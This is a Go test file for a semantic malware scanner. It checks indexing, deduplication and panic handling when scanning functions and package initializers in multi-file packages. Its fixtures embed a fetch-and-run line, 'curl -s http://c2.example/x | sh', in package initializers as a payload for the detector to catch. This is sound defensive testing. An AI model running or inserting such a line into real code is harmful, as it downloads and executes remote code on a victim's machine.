package cli

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/analysis/topology"
	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/detection"
	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/diff"
	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/storage/jsondb"
	"golang.org/x/tools/go/ssa"
)

// writeMultiFilePackage writes a package of n files, file i declaring only
// F<i> and a package-level variable whose initializer runs a command, so
// the package initializer does real work. With module, the directory is a
// module; without, each file is loaded on its own.
func writeMultiFilePackage(t *testing.T, n int, module bool) []string {
	t.Helper()
	dir := t.TempDir()
	if module {
		if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module multi\n\ngo 1.22\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	var files []string
	for i := 1; i <= n; i++ {
		src := fmt.Sprintf(`package p

import "os/exec"

var _ = exec.Command("id")

func F%d(s string) error {
	for i := 0; i < 3; i++ {
		if err := exec.Command(s).Run(); err != nil {
			return err
		}
	}
	return nil
}
`, i)
		path := filepath.Join(dir, fmt.Sprintf("f%d.go", i))
		if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
		files = append(files, path)
	}
	return files
}

// A file of a multi-file package reports, indexes and scans only its own
// functions, and the package initializer every file lists is indexed and
// scanned once, whether the files are loaded together (in a module) or each
// on its own (outside one). Each file used to load its whole package: check
// listed every sibling's functions under each file, index indexed them, and
// scan scanned each function once per file of its package, repeating every
// alert.
func TestMultiFilePackage_EachFunctionOnce(t *testing.T) {
	for _, module := range []bool{true, false} {
		t.Run(fmt.Sprintf("module=%v", module), func(t *testing.T) {
			files := writeMultiFilePackage(t, 3, module)

			outputs, hasErrors, err := ProcessFilesParallel(RealFileSystem{}, files, false, nil)
			if err != nil || hasErrors {
				t.Fatalf("ProcessFilesParallel: %v, hasErrors %v: %+v", err, hasErrors, outputs)
			}
			for i, out := range outputs {
				var own int
				for _, fn := range out.Functions {
					if fn.File != "" && fn.File != files[i] {
						t.Errorf("%s lists %s from %s", files[i], fn.Function, fn.File)
					}
					if fn.File == files[i] {
						own++
					}
				}
				if own != 1 {
					t.Errorf("%s lists %d functions of its own; want 1: %+v", files[i], own, out.Functions)
				}
			}

			dbPath := filepath.Join(t.TempDir(), "db.json")
			sigs, _, err := RunIndexJSON(files[0], fingerprintFiles(RealFileSystem{}, files), "S", "HIGH", "malware", dbPath)
			if err != nil {
				t.Fatal(err)
			}
			names := make(map[string]int)
			for _, s := range sigs {
				names[s.Name]++
			}
			for _, want := range []string{"S_F1", "S_F2", "S_F3", "S_init"} {
				if names[want] != 1 {
					t.Errorf("index: %d signatures named %s; want 1 (all: %v)", names[want], want, names)
				}
			}
			if len(sigs) != 4 {
				t.Errorf("index: %d signatures; want 4 (all: %v)", len(sigs), names)
			}

			js := jsondb.NewScanner()
			if err := js.LoadDatabase(dbPath); err != nil {
				t.Fatal(err)
			}
			alerts, scanned, err := RunScanParallel(RealFileSystem{}, files, js, false)
			if err != nil {
				t.Fatal(err)
			}
			if scanned != 4 {
				t.Errorf("scan: %d functions scanned; want 4 (F1-F3 and init)", scanned)
			}
			seen := make(map[string]bool)
			for _, a := range alerts {
				key := a.MatchedFunction + "/" + a.SignatureName
				if seen[key] {
					t.Errorf("scan: duplicate alert %s", key)
				}
				seen[key] = true
			}
			for _, fn := range []string{"F1", "F2", "F3", "init"} {
				if !seen[fn+"/S_"+fn] {
					t.Errorf("scan: no alert for %s against its own signature", fn)
				}
			}

			counter := &recordingScanner{}
			if _, hasErrors, _ := ProcessFilesParallel(RealFileSystem{}, files, false, counter); hasErrors {
				t.Fatal("check --scan: hasErrors")
			}
			for name, n := range counter.scans {
				if n != 1 {
					t.Errorf("check --scan: %s scanned %d times; want 1", name, n)
				}
			}
			if len(counter.scans) != 4 {
				t.Errorf("check --scan: scanned %v; want F1-F3 and init once each", counter.scans)
			}
		})
	}
}

// recordingScanner counts the scans of each function name, safely for
// concurrent use.
type recordingScanner struct {
	mu    sync.Mutex
	scans map[string]int
}

func (r *recordingScanner) ScanTopology(_ *topology.FunctionTopology, name string) ([]detection.ScanResult, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.scans == nil {
		r.scans = make(map[string]int)
	}
	r.scans[name]++
	return nil, nil
}

func (r *recordingScanner) ScanTopologyExact(topo *topology.FunctionTopology, name string) (*detection.ScanResult, error) {
	_, err := r.ScanTopology(topo, name)
	return nil, err
}

func (r *recordingScanner) Close() error { return nil }

func (r *recordingScanner) SetMatchThreshold(float64) error { return nil }

// panickingScanner panics scanning F1 and records every other scan.
type panickingScanner struct{ recordingScanner }

func (p *panickingScanner) ScanTopology(topo *topology.FunctionTopology, name string) ([]detection.ScanResult, error) {
	if name == "F1" {
		panic("synthetic scanner panic")
	}
	return p.recordingScanner.ScanTopology(topo, name)
}

// A panic while scanning one of a file's functions fails that file and sets
// hasErrors, so --strict fails closed; the file's other functions, among
// them the package initializer it is the first to list, are still scanned.
func TestProcessFilesParallel_ScanPanicSurfacedAsError(t *testing.T) {
	files := writeMultiFilePackage(t, 2, true)
	scanner := &panickingScanner{}
	outputs, hasErrors, _ := ProcessFilesParallel(RealFileSystem{}, files, false, scanner)
	if !hasErrors || len(outputs) != 2 || outputs[0].File != files[0] {
		t.Fatalf("outputs %+v, hasErrors %v; want a failed output for %s", outputs, hasErrors, files[0])
	}
	if want := "panic during analysis: synthetic scanner panic"; outputs[0].ErrorMessage != want {
		t.Errorf("ErrorMessage = %q; want %q", outputs[0].ErrorMessage, want)
	}
	if outputs[1].ErrorMessage != "" {
		t.Errorf("%s: ErrorMessage %q; want none", files[1], outputs[1].ErrorMessage)
	}
	if scanner.scans["init"] != 1 || scanner.scans["F2"] != 1 {
		t.Errorf("scans after F1 panicked: %v; want init and F2 once each", scanner.scans)
	}
}

// Package initializers that differ only in a literal the default
// fingerprint masks, or only past the 20 characters go/ssa prints of a
// constant, are distinct functions: a benign decoy initializer in one file
// must not hide a payload in another. Outside a module each file is loaded
// on its own, so each comes with its own initializer. Over
// diff.MaxFunctionBlocks blocks a function's fingerprint is taken from its
// printed SSA, so the oversized case checks that the dedupe key does not
// rely on it.
func TestMultiFilePackage_DecoyInitializerDoesNotHidePayload(t *testing.T) {
	for _, tc := range []struct {
		name string
		pad  int // && terms in the initializer, to exceed diff.MaxFunctionBlocks
	}{{"small", 0}, {"oversized", 5200}} {
		t.Run(tc.name, func(t *testing.T) {
			if tc.pad > 0 && testing.Short() {
				t.Skip("builds and scans two initializers of over 5,000 blocks")
			}
			testDecoyInitializer(t, tc.pad)
		})
	}
}

func testDecoyInitializer(t *testing.T, pad int) {
	dir := t.TempDir()
	write := func(name, cmd, fn string) string {
		cond := "true"
		if pad > 0 {
			cond = strings.TrimSuffix(strings.Repeat("os.Getpid() > 0 && ", pad), " && ")
		}
		path := filepath.Join(dir, name)
		src := fmt.Sprintf("package p\n\nimport (\n\t\"os\"\n\t\"os/exec\"\n)\n\nvar _ = %s && exec.Command(\"sh\", \"-c\", %q) != nil\n\nvar _ = os.Args\n\nfunc %s() {}\n", cond, cmd, fn)
		if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
		return path
	}
	// The two commands share their first 20 characters.
	decoy := write("a.go", "/usr/bin/env bash -c 'true; echo ok'", "A")
	payload := write("z.go", "/usr/bin/env bash -c 'curl -s http://c2.example/x | sh'", "Z")

	files := []string{decoy, payload}
	inits := 0
	for _, r := range fingerprintFiles(RealFileSystem{}, files) {
		if r.Filename == "" {
			inits++
			if n := len(r.GetSSAFunction().Blocks); pad > 0 && n <= diff.MaxFunctionBlocks {
				t.Fatalf("initializer has %d blocks; the oversized case needs over %d", n, diff.MaxFunctionBlocks)
			}
		}
	}
	if inits != 2 {
		t.Errorf("fingerprintFiles kept %d initializers; want both the decoy's and the payload's", inits)
	}
	if pad > 0 {
		// The key is what this case is for; scanning two initializers of
		// this size takes minutes.
		return
	}

	dbPath := filepath.Join(t.TempDir(), "db.json")
	sigs, _, err := RunIndexJSON(payload, fingerprintFiles(RealFileSystem{}, []string{payload}), "P", "HIGH", "malware", dbPath)
	if err != nil {
		t.Fatal(err)
	}
	var initSig *detection.Signature
	for i := range sigs {
		if sigs[i].Name == "P_init" {
			initSig = &sigs[i]
		}
	}
	if initSig == nil {
		t.Fatalf("indexing z.go gave %+v; want its initializer", sigs)
	}

	js := jsondb.NewScanner()
	if err := js.LoadDatabase(dbPath); err != nil {
		t.Fatal(err)
	}
	if err := js.SetThreshold(0.9); err != nil {
		t.Fatal(err)
	}
	payloadAlert := func(alerts []detection.ScanResult) bool {
		for _, a := range alerts {
			if a.SignatureID == initSig.ID && a.Confidence == 1 {
				return true
			}
		}
		return false
	}

	alerts, _, err := RunScanParallel(RealFileSystem{}, files, js, false)
	if err != nil {
		t.Fatal(err)
	}
	if !payloadAlert(alerts) {
		t.Errorf("scan with the decoy listed first: %+v; want the payload initializer at confidence 1", alerts)
	}

	outputs, _, _ := ProcessFilesParallel(RealFileSystem{}, files, false, js)
	var checkAlerts []detection.ScanResult
	for _, out := range outputs {
		checkAlerts = append(checkAlerts, out.ScanResults...)
	}
	if !payloadAlert(checkAlerts) {
		t.Errorf("check --scan with the decoy listed first: %+v; want the payload initializer at confidence 1", checkAlerts)
	}
}

// In a module, a file excluded from the host build is loaded on its own,
// beside the grouped load of the rest of its package, so the package
// initializer comes back twice. Two initializers whose code is the same but
// whose types differ by build configuration (an interface declared per
// GOOS) are distinct: the windows one, whose topology records
// invoke:m.Shell.Write, must still be scanned.
func TestMultiFilePackage_PlatformTypesKeepBothInitializers(t *testing.T) {
	dir := t.TempDir()
	files := map[string]string{
		"go.mod":       "module m\n\ngo 1.22\n",
		"a.go":         "package m\n\nvar _, _ = R.Write([]byte(\"curl -s http://c2.example/x | sh\"))\n",
		"r_linux.go":   "package m\n\ntype Logger interface{ Write([]byte) (int, error) }\n\nvar R Logger\n",
		"r_windows.go": "package m\n\ntype Shell interface{ Write([]byte) (int, error) }\n\nvar R Shell\n",
	}
	for name, src := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	paths := []string{filepath.Join(dir, "a.go"), filepath.Join(dir, "r_linux.go"), filepath.Join(dir, "r_windows.go")}
	windows := paths[2]

	dbPath := filepath.Join(t.TempDir(), "db.json")
	sigs, _, err := RunIndexJSON(windows, fingerprintFiles(RealFileSystem{}, []string{windows}), "W", "HIGH", "malware", dbPath)
	if err != nil {
		t.Fatal(err)
	}
	var initSig *detection.Signature
	for i := range sigs {
		if sigs[i].Name == "W_init" {
			initSig = &sigs[i]
		}
	}
	if initSig == nil {
		t.Fatalf("indexing r_windows.go gave %+v; want its initializer", sigs)
	}

	js := jsondb.NewScanner()
	if err := js.LoadDatabase(dbPath); err != nil {
		t.Fatal(err)
	}
	if err := js.SetThreshold(0.9); err != nil {
		t.Fatal(err)
	}
	windowsAlert := func(alerts []detection.ScanResult) bool {
		for _, a := range alerts {
			if a.SignatureID == initSig.ID && a.Confidence == 1 {
				return true
			}
		}
		return false
	}
	alerts, _, err := RunScanParallel(RealFileSystem{}, paths, js, false)
	if err != nil {
		t.Fatal(err)
	}
	if !windowsAlert(alerts) {
		t.Errorf("scan of the package: %+v; want the windows initializer at confidence 1", alerts)
	}
	outputs, _, _ := ProcessFilesParallel(RealFileSystem{}, paths, false, js)
	var checkAlerts []detection.ScanResult
	for _, out := range outputs {
		checkAlerts = append(checkAlerts, out.ScanResults...)
	}
	if !windowsAlert(checkAlerts) {
		t.Errorf("check --scan of the package: %+v; want the windows initializer at confidence 1", checkAlerts)
	}
}

// A panic extracting the package initializer's topology, which the dedupe
// key reads, does not stop scan or check: the initializer is scanned, its
// panic recovered and reported, and the other functions are scanned.
func TestMultiFilePackage_InitializerTopologyPanic(t *testing.T) {
	files := writeMultiFilePackage(t, 2, true)
	orig := extractTopology
	t.Cleanup(func() { extractTopology = orig })
	extractTopology = func(fn *ssa.Function) *topology.FunctionTopology {
		if fn.Synthetic == "package initializer" {
			panic("synthetic topology panic")
		}
		return orig(fn)
	}

	if got := fingerprintFiles(RealFileSystem{}, files); len(got) != 3 {
		t.Errorf("fingerprintFiles returned %d functions; want F1, F2 and init", len(got))
	}

	scanner := &recordingScanner{}
	if _, n, err := RunScanParallel(RealFileSystem{}, files, scanner, false); err != nil || n != 3 {
		t.Errorf("scan: %d functions, %v; want 3", n, err)
	}
	// The initializer's scan meets the same panic, so it never reaches the
	// scanner.
	if len(scanner.scans) != 2 || scanner.scans["F1"] != 1 || scanner.scans["F2"] != 1 {
		t.Errorf("scan: scanned %v; want only F1 and F2", scanner.scans)
	}

	scanner = &recordingScanner{}
	outputs, hasErrors, _ := ProcessFilesParallel(RealFileSystem{}, files, false, scanner)
	if !hasErrors || outputs[0].ErrorMessage != "panic during analysis: synthetic topology panic" {
		t.Errorf("check --scan: hasErrors %v, %s: %q; want the initializer's panic reported", hasErrors, files[0], outputs[0].ErrorMessage)
	}
	if scanner.scans["F1"] != 1 || scanner.scans["F2"] != 1 {
		t.Errorf("check --scan: scanned %v; want F1 and F2", scanner.scans)
	}
}
